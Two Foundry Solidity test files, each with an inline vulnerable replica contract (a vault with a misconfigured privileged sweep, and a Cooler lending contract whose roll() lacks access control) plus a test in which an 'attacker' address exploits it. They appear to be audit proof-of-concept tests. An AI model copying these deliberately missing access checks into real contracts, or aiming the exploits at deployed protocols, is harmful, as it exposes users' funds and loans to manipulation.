pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract BaseStrategyVault {
    // minimal state needed
    address public NOTIONAL;

    constructor(address notional_) {
        NOTIONAL = notional_;
    }

    // Vulnerable: external payable receive with no access control
    receive() external payable {
        // Allow ETH transfers to succeed
    }

    modifier onlyNotional() {
        require(msg.sender == NOTIONAL, "only notional");
        _;
    }

    // A privileged function that forwards all ETH to NOTIONAL
    function sweepToNotional() external onlyNotional {
        payable(NOTIONAL).transfer(address(this).balance);
    }
}

contract BaseStrategyVaultTest is Test {
    BaseStrategyVault target;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        // Deploy the vault with NOTIONAL set to the attacker address to model a
        // scenario where the privileged receiver could be controlled/misconfigured
        target = new BaseStrategyVault(attacker);
        // Fund attacker so they can send ETH to the vault
        vm.deal(attacker, 1 ether);
    }

    function test_attacker_exploits_receive() public {
        // Attacker sends ETH to the vault — triggers receive() which has no AC
        vm.prank(attacker);
        (bool ok, ) = address(target).call{value: 0.5 ether}("");
        assert(ok);
        // Vault now holds the injected ETH
        assertEq(address(target).balance, 0.5 ether);

        // Because NOTIONAL was set to attacker (misconfiguration), attacker can call privileged sweep
        vm.prank(attacker);
        target.sweepToNotional();

        // Funds have been forwarded out of the vault
        assertEq(address(target).balance, 0);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal ERC20 stub used by Cooler
contract ERC20 {
    function transferFrom(address, address, uint256) external virtual returns (bool) {
        // intentionally permissive for PoC
        return true;
    }
    function transfer(address, uint256) external virtual returns (bool) {
        return true;
    }
}

contract Cooler {
    uint256 private constant decimals = 1e18;

    struct Request { uint256 amount; uint256 interest; uint256 loanToCollateral; uint256 duration; bool active; }
    struct Loan { Request request; uint256 amount; uint256 collateral; uint256 expiry; bool rollable; address lender; }

    Request[] public requests;
    Loan[] public loans;

    address private immutable owner;
    ERC20 public immutable collateral;
    ERC20 public immutable debt;

    constructor() {
        owner = address(0xABCD);
        collateral = new ERC20();
        debt = new ERC20();

        // create a sample request and a cleared loan to be rolled
        Request memory req = Request(100 * decimals, 1e17, 2 * decimals, 365 days, false);
        uint256 interest = interestFor(req.amount, req.interest, req.duration);
        uint256 collat = collateralFor(req.amount, req.loanToCollateral);
        loans.push(Loan(req, req.amount + interest, collat, block.timestamp + req.duration, true, address(0xBEEF)));
    }

    function collateralFor(uint256 amount, uint256 loanToCollateral) public pure returns (uint256) {
        return amount * decimals / loanToCollateral;
    }
    function interestFor(uint256 amount, uint256 rate, uint256 duration) public pure returns (uint256) {
        uint256 interest = rate * duration / 365 days;
        return amount * interest / decimals;
    }

    // VULNERABLE: no access control — anyone can call roll
    function roll(uint256 loanID) external {
        Loan storage loan = loans[loanID];
        Request memory req = loan.request;

        if (block.timestamp > loan.expiry) revert();
        if (!loan.rollable) revert();

        uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;
        uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);

        loan.amount += newDebt;
        loan.expiry += req.duration;
        loan.collateral += newCollateral;

        collateral.transferFrom(msg.sender, address(this), newCollateral);
    }

    // helpers for testing
    function loanAmount(uint256 id) external view returns (uint256) { return loans[id].amount; }
    function loanExpiry(uint256 id) external view returns (uint256) { return loans[id].expiry; }
    function loanCollateral(uint256 id) external view returns (uint256) { return loans[id].collateral; }
    function loanLender(uint256 id) external view returns (address) { return loans[id].lender; }
}

contract CoolerTest is Test {
    Cooler target;
    address attacker;

    function setUp() public {
        target = new Cooler();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_roll() public {
        uint256 oldAmount = target.loanAmount(0);
        uint256 oldExpiry = target.loanExpiry(0);
        address oldLender = target.loanLender(0);

        vm.prank(attacker);
        target.roll(0);

        uint256 newAmount = target.loanAmount(0);
        uint256 newExpiry = target.loanExpiry(0);
        address newLender = target.loanLender(0);

        // attacker was NOT lender but succeeded in rolling the loan
        assertEq(oldLender, newLender);
        assertTrue(newAmount > oldAmount);
        assertTrue(newExpiry > oldExpiry);
    }
}

